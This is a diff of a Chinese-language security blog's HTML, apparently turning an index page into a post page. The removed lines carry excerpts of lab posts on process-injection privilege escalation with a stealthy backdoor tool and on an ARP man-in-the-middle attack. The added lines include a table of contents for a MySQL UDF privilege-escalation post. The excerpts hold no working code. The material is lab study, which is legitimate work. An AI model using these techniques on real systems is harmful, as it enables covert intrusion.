-            <a class="btn" href="/2018/12/09/渗透测试-靶机Bulldog2/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/10/22/注入进程提权（工具-Pinjector）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/22/注入进程提权（工具-Pinjector）/" itemprop="url">注入进程提权（工具-Pinjector）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-22T21:05:03+08:00">
-                2018-10-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          注入进程提权相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听
-工具下载pinjector.exe 程序下载地址https://www.tarasco.org/security/Process_Injector/index.html
-测试过程靶机：win server20
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/10/22/注入进程提权（工具-Pinjector）/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/08/11/三层-ARP中间人攻击（工具P2P）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/11/三层-ARP中间人攻击（工具P2P）/" itemprop="url">三层-ARP中间人攻击（工具P2P）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-11T07:03:03+08:00">
-                2018-08-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">内网渗透</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          ARP地址解析协议，根据IP地址获取物理地址(MAC)的一个TCP/IP协议
-利用 ARP 进行中间人攻击
-实验环境：攻击机：Win Server 2003 IP：192.168..195.129靶机：Win XP IP：192.168.195.128
-
-测试过程：
-
-
-
-使用arp -a命令查看w
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/08/11/三层-ARP中间人攻击（工具P2P）/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
-  </nav>
-
 
 
           </div>
@@ -1357,6 +544,10 @@ nmap -sV -p- 192.168.60.231
 
 
           
+
+  
+
+
 
         </div>
         
@@ -1377,8 +568,17 @@ nmap -sV -p- 192.168.60.231
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -1429,6 +629,22 @@ nmap -sV -p- 192.168.60.231
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql-安装"><span class="nav-number">1.</span> <span class="nav-text">Mysql 安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MYSQL-利用udf提权"><span class="nav-number">2.</span> <span class="nav-text">MYSQL 利用udf提权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#提权思路："><span class="nav-number">2.1.</span> <span class="nav-text">提权思路：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#提权步骤"><span class="nav-number">2.2.</span> <span class="nav-text">提权步骤</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1563,6 +779,10 @@ nmap -sV -p- 192.168.60.231
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
